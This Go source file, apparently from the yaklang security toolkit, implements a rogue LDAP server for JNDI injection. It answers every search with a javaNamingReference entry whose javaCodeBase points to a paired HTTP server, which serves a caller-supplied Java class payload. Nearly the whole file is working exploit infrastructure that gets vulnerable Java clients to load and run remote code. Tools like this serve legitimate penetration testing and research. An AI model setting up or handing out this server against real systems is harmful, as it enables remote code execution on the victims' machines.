package ldapserver

import (
	"context"
	"fmt"
	"github.com/lor00x/goldap/message"
	"math/rand"
	"net/http"
	"yaklang/common/log"
	"yaklang/common/utils"
)

type LdapServer struct {
	host      string
	ldapport  int
	webport   int
	resource  []byte
	className string
	//gadget GadgetFunc
	classRes func(name string) []byte
}

//exports func
func NewLdapServer() *LdapServer {
	host := "127.0.0.1"
	ldapport := utils.GetRandomAvailableTCPPort()
	weboprt := utils.GetRandomAvailableTCPPort()
	return &LdapServer{host: host, ldapport: ldapport, webport: weboprt}
}

func NewLdapServerWithPort(ldapport int, weboprt int) LdapServer {
	host := "127.0.0.1"
	return LdapServer{host: host, ldapport: ldapport, webport: weboprt}
}

//LdapServer func
func (l *LdapServer) SetResource(resource []byte) {
	l.resource = resource
}
func (l *LdapServer) SetPayload(f func(name string) []byte) {
	l.classRes = f
}

func (l *LdapServer) GetAddr() string {
	return fmt.Sprintf("%s:%d", l.host, l.ldapport)
}
func (l *LdapServer) GetUrl() string {
	return fmt.Sprintf("ldap://%s:%d/", l.host, l.ldapport)
}
func (l *LdapServer) GetClassUrl() string {
	return fmt.Sprintf("http://%s:%d/%s.class", l.host, l.webport, l.className)
}

func (l *LdapServer) Run(ctx context.Context) {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	randStr := func(n int) string {
		b := make([]byte, n)
		for i := range b {
			b[i] = letters[rand.Intn(len(letters))]
		}
		return string(b)
	}
	var className string
	handleSearch := func(w ResponseWriter, m *Message) {
		//r := m.GetSearchRequest()
		//name := string(r.BaseObject())
		className = "cmd_" + randStr(8)
		addr := fmt.Sprintf("http://%s:%d/", l.host, l.webport)
		e := NewSearchResultEntry(fmt.Sprintf("dc=%s,dc=com", "tmp"))
		//e.AddAttribute("javaSerializedData", "\xac\xed\x00\x05\x73\x72\x00\x04\x65\x76\x69\x6c\xe3\x60\x39\x71\x04\x7d\x9d\xff\x02\x00\x00\x78\x70")
		//e.AddAttribute("javaRemoteLocation", message.AttributeValue(addr))
		e.AddAttribute("javaClassName", "foo")
		e.AddAttribute("javaCodeBase", message.AttributeValue(addr))
		e.AddAttribute("objectClass", "javaNamingReference")
		e.AddAttribute("javaFactory", message.AttributeValue(className))
		w.Write(e)
		res := NewSearchResultDoneResponse(LDAPResultSuccess)
		w.Write(res)
	}
	handleBind := func(w ResponseWriter, m *Message) {
		res := NewBindResponse(LDAPResultSuccess)
		//res.SetDiagnosticMessage("OK")
		w.Write(res)
		return
	}

	server := NewServer()
	routes := NewRouteMux()
	routes.Bind(handleBind)
	routes.Search(handleSearch)
	server.Handle(routes)
	//start web server
	http.HandleFunc("/", func(writer http.ResponseWriter, request *http.Request) {
		//path := request.URL.Path
		writer.Write(l.classRes(className))
	})
	//l.webport = l.ldapport + 1
	go http.ListenAndServe(fmt.Sprintf("%s:%d", l.host, l.webport), nil)
	log.Info("WebServer started")
	err := utils.WaitConnect(fmt.Sprintf("%s:%d", l.host, l.webport), 3)
	if err != nil {
		return
	}
	//for {
	//	select {
	//	case <-ctxx.Done():
	//		log.Info("Webserver exited")
	//		return
	//	}
	//}
	//启动ldap服务
	go server.ListenAndServe(fmt.Sprintf("%s:%d", l.host, l.ldapport))
	log.Info("LdapServer started")

	for {
		select {
		case <-ctx.Done():
			//cancel()
			server.Stop()
			log.Info("ldapserver exited")
			return
		}
	}
}
